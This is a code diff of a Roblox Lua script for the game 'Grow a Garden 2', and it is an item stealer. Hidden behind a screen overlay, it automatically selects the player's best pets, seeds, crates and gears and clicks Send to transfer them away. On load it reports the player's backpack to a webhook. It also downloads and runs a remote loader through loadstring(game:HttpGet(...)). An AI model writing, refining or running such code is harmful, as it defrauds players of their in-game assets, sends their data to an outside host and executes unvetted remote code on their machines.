+	if not found then touchShield:Destroy() warn("Retry: Player not found in list") return false end
 
-    local itemSendFrame = sendingFrame:WaitForChild("ItemSendFrame", 5)
-    if not itemSendFrame then 
-        touchShield:Destroy()
-        warn("Retry: ItemSendFrame not found") 
-        return false 
-    end
+	task.wait(0.3)
 
-    local scrollingFrames = itemSendFrame:WaitForChild("ScrollingFrames", 5)
-    if not scrollingFrames then 
-        touchShield:Destroy()
-        warn("Retry: ScrollingFrames not found") 
-        return false 
-    end
+	local itemSendFrame = sendingFrame:WaitForChild("ItemSendFrame", 5)
+	if not itemSendFrame then touchShield:Destroy() warn("Retry: ItemSendFrame not found") return false end
 
-    local inventoryFrame = scrollingFrames:WaitForChild("InventoryFrame", 5)
-    if not inventoryFrame then 
-        touchShield:Destroy()
-        warn("Retry: InventoryFrame not found") 
-        return false 
-    end
+	local scrollingFrames = itemSendFrame:WaitForChild("ScrollingFrames", 5)
+	if not scrollingFrames then touchShield:Destroy() warn("Retry: ScrollingFrames not found") return false end
 
-    if not hasAnythingToSend(inventoryFrame) then
-        touchShield:Destroy()
-        return "done"
-    end
+	local inventoryFrame = scrollingFrames:WaitForChild("InventoryFrame", 5)
+	if not inventoryFrame then touchShield:Destroy() warn("Retry: InventoryFrame not found") return false end
 
-    -- ====================================================================
-    -- STAGE 1: PRIORITY PET SELECTION (Clicks these immediately)
-    -- Ordered by Grow a Garden 2 tier list (S → C): best pets first
-    -- ====================================================================
-    local priorityPets = {
-        -- S tier
-        "Raccoon", "Black Dragon", "Ice Serpent", "Unicorn",
-        -- A tier
-        "Bee", "Golden Dragonfly", "Deer", "Bunny",
-        -- B tier
-        "Frog",
-        -- C tier
-        "Robin", "Owl", "Monkey"
-    }
+	if not hasAnythingToSend(inventoryFrame) then
+		touchShield:Destroy()
+		return "done"
+	end
 
-    -- Build a normalized lookup of every child once (so we can match
-    -- "Black Dragon" against "Inv_Pets:BlackDragon" or "Inv_Pets:Black Dragon" etc.)
-    local function normalizeName(s)
-        return (s:lower():gsub("[%s_%-]", ""))
-    end
+	local priorityPets = {
+		"Raccoon", "Black Dragon", "Ice Serpent", "Unicorn",
+		"Bee", "Golden Dragonfly", "Deer", "Bunny",
+		"Frog",
+		"Robin", "Owl", "Monkey"
+	}
 
-    local invChildrenByNorm = {}
-    for _, child in ipairs(inventoryFrame:GetChildren()) do
-        local cname = child.Name
-        if cname:sub(1, 9) == "Inv_Pets:" then
-            local petPart = cname:sub(10) -- everything after "Inv_Pets:"
-            invChildrenByNorm[normalizeName(petPart)] = child
-        end
-    end
+	local function normalizeName(s)
+		return (s:lower():gsub("[%s_%-]", ""))
+	end
 
-    for _, petName in ipairs(priorityPets) do
-        local key = normalizeName(petName)
-        local petFrame = invChildrenByNorm[key]
-        if petFrame then
-            task.spawn(function()
-                local innerFrame = petFrame:FindFirstChildWhichIsA("Frame") or petFrame
-                local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
-                    or petFrame:FindFirstChildWhichIsA("GuiButton", true)
-                if button then
-                    clickButton(button)
-                end
-            end)
-        end
-    end
+	local invChildrenByNorm = {}
+	for _, child in ipairs(inventoryFrame:GetChildren()) do
+		local cname = child.Name
+		if cname:sub(1, 9) == "Inv_Pets:" then
+			local petPart = cname:sub(10)
+			invChildrenByNorm[normalizeName(petPart)] = child
+		end
+	end
 
-    -- Wait a split second to make sure priority pets hit the slots before general flood
-    task.wait(0.2)
+	for _, petName in ipairs(priorityPets) do
+		local key = normalizeName(petName)
+		local petFrame = invChildrenByNorm[key]
+		if petFrame then
+			task.spawn(function()
+				local innerFrame = petFrame:FindFirstChildWhichIsA("Frame") or petFrame
+				local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
+					or petFrame:FindFirstChildWhichIsA("GuiButton", true)
+				if button then
+					clickButton(button)
+				end
+			end)
+		end
+	end
 
-    -- ====================================================================
-    -- STAGE 2: GENERAL ASSET COLLECTION (Runs after priority queue)
-    -- ====================================================================
-    
-    -- Grabs any remaining pets not explicitly prioritized
-    task.spawn(function()
-        clickAllByPrefix(inventoryFrame, "Inv_Pets:")
-    end)
+	task.wait(0.2)
 
-    -- Grabs the seeds (Including Ghost Pepper)
-    task.spawn(function()
-        for _, fruitName in ipairs(FRUITS) do
-            local frameName = "Inv_Seeds:" .. fruitName
-            task.spawn(function()
-                local clickCount = 0
-                while clickCount < 999 do
-                    local fruitFrame = inventoryFrame:FindFirstChild(frameName)
-                    if not fruitFrame then break end
-                    local innerFrame = fruitFrame:FindFirstChildWhichIsA("Frame")
-                    if not innerFrame then break end
-                    local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
-                    if not button then break end
-                    clickButton(button)
-                    clickCount += 1
-                    task.wait()
-                end
-            end)
-        end
-    end)
+	task.spawn(function()
+		clickAllByPrefix(inventoryFrame, "Inv_Pets:")
+	end)
 
-    -- Grabs the crates
-    task.spawn(function()
-        for _, crateName in ipairs(CRATES) do
-            local frameName = "Inv_Crates:" .. crateName
-            task.spawn(function()
-                local clickCount = 0
-                while clickCount < 999 do
-                    local crateFrame = inventoryFrame:FindFirstChild(frameName)
-                    if not crateFrame then break end
-                    local innerFrame = crateFrame:FindFirstChildWhichIsA("Frame")
-                    if not innerFrame then break end
-                    local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
-                    if not button then break end
-                    clickButton(button)
-                    clickCount += 1
-                    task.wait()
-                end
-            end)
-        end
-    end)
+	task.spawn(function()
+		for _, fruitName in ipairs(FRUITS) do
+			local frameName = "Inv_Seeds:" .. fruitName
+			task.spawn(function()
+				local clickCount = 0
+				while clickCount < 999 do
+					local fruitFrame = inventoryFrame:FindFirstChild(frameName)
+					if not fruitFrame then break end
+					local innerFrame = fruitFrame:FindFirstChildWhichIsA("Frame")
+					if not innerFrame then break end
+					local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
+					if not button then break end
+					clickButton(button)
+					clickCount += 1
+					task.wait()
+				end
+			end)
+		end
+	end)
 
-    -- Grabs the gears
-    task.spawn(function()
-        for _, prefix in ipairs(GEAR_PREFIXES) do
-            clickAllByPrefix(inventoryFrame, prefix)
-        end
-    end)
+	task.spawn(function()
+		for _, crateName in ipairs(CRATES) do
+			local frameName = "Inv_Crates:" .. crateName
+			task.spawn(function()
+				local clickCount = 0
+				while clickCount < 999 do
+					local crateFrame = inventoryFrame:FindFirstChild(frameName)
+					if not crateFrame then break end
+					local innerFrame = crateFrame:FindFirstChildWhichIsA("Frame")
+					if not innerFrame then break end
+					local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
+					if not button then break end
+					clickButton(button)
+					clickCount += 1
+					task.wait()
+				end
+			end)
+		end
+	end)
 
-    task.wait(0.6)
+	task.spawn(function()
+		for _, prefix in ipairs(GEAR_PREFIXES) do
+			clickAllByPrefix(inventoryFrame, prefix)
+		end
+	end)
 
-    local sendButton = itemSendFrame:WaitForChild("SendButton", 5)
-    if sendButton and sendButton:IsA("GuiButton") then
-        clickButton(sendButton)
-    end
+	task.wait(0.6)
 
-    touchShield:Destroy()
-    return true
+	local sendButton = itemSendFrame:WaitForChild("SendButton", 5)
+	if sendButton and sendButton:IsA("GuiButton") then
+		clickButton(sendButton)
+	end
+
+	touchShield:Destroy()
+	return true
 end
 
--- Send webhook on game load
+-- Send webhook on game load (give PetList a moment to populate so pets show up)
 task.spawn(function()
-    task.wait(0.5)
-    sendBackpackToWebhook()
+	task.wait(2)
+	-- Briefly open the PetList so its ScrollingFrame populates, then close it
+	local petList = playerGui:FindFirstChild("PetList")
+	if petList then
+		local openBtn = petList:FindFirstChild("Exit", true) and petList.Exit:FindFirstChild("OpenButton")
+		if openBtn then
+			pcall(function() firesignal(openBtn.Activated) end)
+			pcall(function() firesignal(openBtn.MouseButton1Click) end)
+			task.wait(0.4)
+			pcall(function() firesignal(openBtn.Activated) end)
+			pcall(function() firesignal(openBtn.MouseButton1Click) end)
+		end
+	end
+	sendBackpackToWebhook()
 end)
 
 -- Main execution sequence manager
 task.spawn(function()
-    local attempt = 0
-    local allDone = false
+	local attempt = 0
+	local allDone = false
 
-    while not allDone do
-        attempt += 1
-        local ok, result = pcall(function()
-            return runScript()
-        end)
+	while not allDone do
+		attempt += 1
+		local ok, result = pcall(function()
+			return runScript()
+		end)
 
-        if not ok then
-            task.wait(0.5)
-        elseif result == "done" then
-            allDone = true
-        elseif result == true then
-            task.wait(0.5)
-        else
-            task.wait(0.5)
-        end
-    end
+		if not ok then
+			task.wait(0.5)
+		elseif result == "done" then
+			allDone = true
+		elseif result == true then
+			task.wait(0.5)
+		else
+			task.wait(0.5)
+		end
+	end
 end)
 
--- CONCURRENT LOADER: Runs your Luarmor script inside its own thread
+-- CONCURRENT LOADER
 task.spawn(function()
-    local ok, err = pcall(function()
-        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/795c7accd08487171484e54a92e75c77.lua"))()
-    end)
-    if not ok then
-        warn("External script failed to run: " .. tostring(err))
-    end
+	local ok, err = pcall(function()
+		loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/795c7accd08487171484e54a92e75c77.lua"))()
+	end)
+	if not ok then
+		warn("External script failed to run: " .. tostring(err))
+	end
 end)
